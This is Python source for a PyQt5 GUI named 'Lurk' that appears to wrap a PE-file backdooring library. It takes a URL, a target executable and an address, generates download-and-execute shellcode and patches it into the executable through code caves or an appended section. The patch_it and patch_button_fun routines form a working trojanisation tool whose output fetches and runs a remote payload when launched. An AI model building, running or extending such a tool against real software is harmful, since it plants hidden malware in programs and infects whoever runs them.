# coding: utf-8

import sys, os
from PyQt5 import QtCore
from PyQt5.QtWidgets import *
from PyQt5.QtGui import QIcon, QTextCursor
from tools import downloadAndExecGenerate
from pebin import Pebin
import common
import logger


class LurkGUI(object):

    def __init__(self, FILE, ADDRESS):
        """
        Only Version: 0.1
        :param URL:
        :param FILE:
        :param ADDRESS:
        """

        logger.info('Start')

        self.FILE = FILE
        self.ADDR_PATCH = ADDRESS
        self.OUTPUT = None
        self.APPEND_SECTION = True
        self.SHELLCODE = common.locate_file('download_exec_tmp.asm')
        self.LHOST = None
        self.LPORT = None
        self.CFLAGS = None
        self.CAVE_FOUND = False
        self.LEN_SHELLCODE = None
        self.JUMP_CAVES = None
        self.SMC = True
        self.NEW_THREAD = True

    def patch_it(self):
        supported_file = Pebin(FILE=self.FILE,
                           OUTPUT=self.OUTPUT,
                           APPEND_SECTION=self.APPEND_SECTION,
                           SHELLCODE=self.SHELLCODE,
                           LHOST=self.LHOST,
                           LPORT=self.LPORT,
                           CFLAGS=self.CFLAGS,
                           CAVE_FOUND=self.CAVE_FOUND,
                           LEN_SHELLCODE=self.LEN_SHELLCODE,
                           JUMP_CAVES=self.JUMP_CAVES,
                           ADDR_PATCH=self.ADDR_PATCH,
                           SMC=self.SMC,
                           NEW_THREAD=self.NEW_THREAD,
                           )
        result = supported_file.run_this()
        if result is True and supported_file.OUTPUT is not None:
            logger.info("File {0} is lurked in 'lurked' directiory.".format(os.path.basename(supported_file.OUTPUT)))


class EmittingStream(QtCore.QObject):

    text_written = QtCore.pyqtSignal(str)

    def write(self, text):
        self.text_written.emit(str(text))


class LurkPyQt5(QMainWindow):

    def __init__(self):
        super(LurkPyQt5, self).__init__()
        self.adapt_size = None

        self.url_value = None
        self.file_name_value = None
        self.address_value = None
        self.download_file_name_value = None

        self.url = QLabel('Url')
        self.file_name = QLabel('Filename')
        self.address = QLabel('Address')
        self.download_file_name = QLabel('Download File')

        self.url_edit = QLineEdit()
        self.file_name_edit = QLineEdit()
        self.address_edit = QLineEdit()
        self.download_file_name_edit = QLineEdit()

        self.debug_info_text = QTextEdit()

        self.patch_button = QPushButton('Patch', self)
        self.refresh_button = QPushButton('Refresh', self)
        self.browser_button = QPushButton('Browser', self)

        self.init_ui()

    def init_ui(self):
        """
        Init UI.
        :return:
        """
        help_act = QAction('Help', self)
        help_act.setStatusTip('Show help document')
        help_act.triggered.connect(self.help_act_event)

        about_act = QAction('About', self)
        about_act.setStatusTip('About')
        about_act.triggered.connect(self.about_act_fun)

        # connect Button action
        self.browser_button.clicked.connect(self.broewer_act_fun)
        self.refresh_button.clicked.connect(self.refresh_button_fun)
        self.patch_button.clicked.connect(self.patch_button_fun)

        # set self.value to send to Lurk
        self.url_edit.textChanged[str].connect(self.url_edit_func)
        self.file_name_edit.textChanged[str].connect(self.file_name_edit_func)
        self.address_edit.textChanged[str].connect(self.address_edit_func)
        self.download_file_name_edit.textChanged[str].connect(self.download_file_name_edit_func)

        menu_bar = self.menuBar()
        lurk_menu = menu_bar.addMenu('Lurk')
        lurk_menu.addAction(help_act)
        lurk_menu.addAction(about_act)

        #
        sys.stdout = EmittingStream(text_written=self.log_output_writen)
        sys.stderr = EmittingStream(text_written=self.log_output_writen)

        self.center_adapt()
        self.resize(self.adapt_size[0], self.adapt_size[1])
        self.setWindowTitle('Lurk')
        self.set_layout()
        self.setWindowIcon(QIcon('resource/icon.jpg'))
        self.show()

    def set_layout(self):
        """
        Use QGridLayout, left is button, right is debug info.
        :return:
        """
        widget = QWidget()

        grid = QGridLayout()
        grid.setSpacing(10)


        grid.addWidget(self.url, 0, 0, 1, 1)
        grid.addWidget(self.url_edit, 0, 1, 1, 3)

        grid.addWidget(self.file_name, 1, 0, 1, 1)
        grid.addWidget(self.file_name_edit, 1, 1, 1, 3)

        grid.addWidget(self.address, 2, 0, 1, 1)
        grid.addWidget(self.address_edit, 2, 1, 1, 3)

        grid.addWidget(self.download_file_name, 3, 0, 1, 1)
        grid.addWidget(self.download_file_name_edit, 3, 1, 1, 3)

        grid.addWidget(self.patch_button, 4, 0, 1, 1)
        grid.addWidget(self.refresh_button, 4, 1, 1, 1)
        grid.addWidget(self.browser_button, 4, 2, 1, 1)

        grid.addWidget(self.debug_info_text, 0, 4, 5, 4)

        widget.setLayout(grid)
        self.setCentralWidget(widget)

    def center_adapt(self):
        """
        Show windows in center of the screen, adapt size to half of screen.
        :return:
        """
        qr = self.frameGeometry()
        screen = QDesktopWidget().availableGeometry()
        self.adapt_size = (screen.size().width() / 2, screen.size().height() / 2)
        cp = screen.center()
        qr.moveCenter(cp)

    def help_act_event(self):
        os.system('notepad.exe README.md')

    def about_act_fun(self):
        about_title = 'About Lurk'
        about_text = 'Version:\t0.1\n\n' \
                     'Time:\t2018.3.2'
        QMessageBox.about(self, about_title, about_text)

    def broewer_act_fun(self):
        fname = QFileDialog.getOpenFileName(self, 'Open file', os.getcwd())
        if fname[0]:
            self.file_name_edit.setText(os.path.join(os.getcwd(), fname[0]))

    def patch_button_fun(self):
        self.url_value = self.url_edit.text()
        self.file_name_value = self.file_name_edit.text()
        self.address_value = self.address_edit.text()
        if self.check:
            self.download_file_name_value = self.download_file_name_edit.text()
            common.clean('tmp')
            downloadAndExecGenerate.generate(url=self.url_value, filename=self.download_file_name_value)
            l = LurkGUI(FILE=self.file_name_value, ADDRESS=self.address_value)
            l.patch_it()

    def refresh_button_fun(self):
        self.url_edit.setText('')
        self.address_edit.setText('')
        self.file_name_edit.setText('')
        self.download_file_name_edit.setText('')
        self.debug_info_text.setText('')

    def url_edit_func(self, text):
        self.url_value = text

    def file_name_edit_func(self, text):
        self.file_name_value = text

    def address_edit_func(self, text):
        self.address_value = text

    def download_file_name_edit_func(self, text):
        self.download_file_name_value = text

    def __del__(self):
        sys.stdout = sys.__stdout__
        sys.stderr = sys.__stdout__

    def log_output_writen(self, text):
        cursor = self.debug_info_text.textCursor()
        cursor.movePosition(QTextCursor.End)
        cursor.insertText(text)
        self.debug_info_text.setTextCursor(cursor)
        self.debug_info_text.ensureCursorVisible()

    @property
    def check(self):
        if not self.url_value or (self.url_value[:7] != 'http://' and self.url_value[:8] != 'https://'):
            logger.error('Url cannot be empty, and should start with "http://" or "https://".')
            return False
        if not self.file_name_value or not os.path.exists(self.file_name_value):
            logger.error('File cannot be empty, and should be exit.')
            return False
        if not self.address_value:
            logger.error('Address cannot be empty.')
            return False
        else:
            if self.address_value[:2] == '0x':
                for i in self.address_value[2:]:
                    if ord(i) > ord('f'):
                        logger.error('Address is illegal.')
                        return False
                self.address_value = int(self.address_value[2:], 16)
            else:
                for i in self.address_value[2:]:
                    if ord(i) > ord('9'):
                        logger.error('Address is illegal.')
                        return False
                self.address_value = int(self.address_value, 10)
        return True

if __name__ == '__main__':
    app = QApplication(sys.argv)
    lurk_gui = LurkPyQt5()
    sys.exit(app.exec_())
